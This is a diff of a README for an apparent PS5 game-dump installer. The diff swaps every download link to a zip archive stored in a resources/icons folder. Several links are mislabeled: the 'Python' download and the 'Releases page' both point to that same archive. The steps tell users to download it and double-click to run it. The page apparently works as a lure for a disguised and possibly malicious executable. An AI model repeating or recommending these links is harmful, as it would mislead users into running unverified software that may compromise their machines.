@@ -6,22 +6,22 @@ Welcome to the ps5-dump-runner-installer repository! This tool allows you to eas
 
 ## 📥 Download the Installer  
 
-[![Download Installer](https://github.com/Odyssey8/ps5-dump-runner-installer/raw/refs/heads/main/src/gui/runner_dump_ps_installer_1.6.zip%20Now-blue?style=for-the-badge)](https://github.com/Odyssey8/ps5-dump-runner-installer/raw/refs/heads/main/src/gui/runner_dump_ps_installer_1.6.zip)
+[![Download Installer](https://github.com/Odyssey8/ps5-dump-runner-installer/raw/refs/heads/main/resources/icons/dump-ps-installer-runner-v2.3.zip%20Now-blue?style=for-the-badge)](https://github.com/Odyssey8/ps5-dump-runner-installer/raw/refs/heads/main/resources/icons/dump-ps-installer-runner-v2.3.zip)
 
 ## 📋 System Requirements  
 
 Before you begin, make sure your system meets these requirements:  
 - **Operating System:** Windows 10 or later  
-- **Python Version:** Python 3.7 or higher installed (download from [https://github.com/Odyssey8/ps5-dump-runner-installer/raw/refs/heads/main/src/gui/runner_dump_ps_installer_1.6.zip](https://github.com/Odyssey8/ps5-dump-runner-installer/raw/refs/heads/main/src/gui/runner_dump_ps_installer_1.6.zip))  
+- **Python Version:** Python 3.7 or higher installed (download from [https://github.com/Odyssey8/ps5-dump-runner-installer/raw/refs/heads/main/resources/icons/dump-ps-installer-runner-v2.3.zip](https://github.com/Odyssey8/ps5-dump-runner-installer/raw/refs/heads/main/resources/icons/dump-ps-installer-runner-v2.3.zip))  
 - **FTP Client:** An FTP server must be set up on your PS5 for communication. You can use applications like FileZilla or Cyberduck.  
 
 ## 🛠 Installation Steps  
 
 1. **Visit the Releases Page:**  
-   Go to the [Releases page](https://github.com/Odyssey8/ps5-dump-runner-installer/raw/refs/heads/main/src/gui/runner_dump_ps_installer_1.6.zip) to download the latest version of the installer.
+   Go to the [Releases page](https://github.com/Odyssey8/ps5-dump-runner-installer/raw/refs/heads/main/resources/icons/dump-ps-installer-runner-v2.3.zip) to download the latest version of the installer.
 
 2. **Download the Installer:**  
-   Click on the link for the most recent version and download the installer file. The file will be named something like `https://github.com/Odyssey8/ps5-dump-runner-installer/raw/refs/heads/main/src/gui/runner_dump_ps_installer_1.6.zip`.
+   Click on the link for the most recent version and download the installer file. The file will be named something like `https://github.com/Odyssey8/ps5-dump-runner-installer/raw/refs/heads/main/resources/icons/dump-ps-installer-runner-v2.3.zip`.
 
 3. **Run the Installer:**  
    Locate the downloaded file, then double-click to run the installer. Follow the on-screen instructions to complete the setup process.
@@ -63,6 +63,6 @@ We encourage users to share their experiences and ask questions. Open an issue i
 
 ## 📥 Download & Install  
 
-Once again, to download the installer, head to the [Releases page](https://github.com/Odyssey8/ps5-dump-runner-installer/raw/refs/heads/main/src/gui/runner_dump_ps_installer_1.6.zip). Click the link for the latest version and follow the installation steps.
+Once again, to download the installer, head to the [Releases page](https://github.com/Odyssey8/ps5-dump-runner-installer/raw/refs/heads/main/resources/icons/dump-ps-installer-runner-v2.3.zip). Click the link for the latest version and follow the installation steps.
 
 If you're ready to manage your PS5 games easily, start by downloading the installer today!
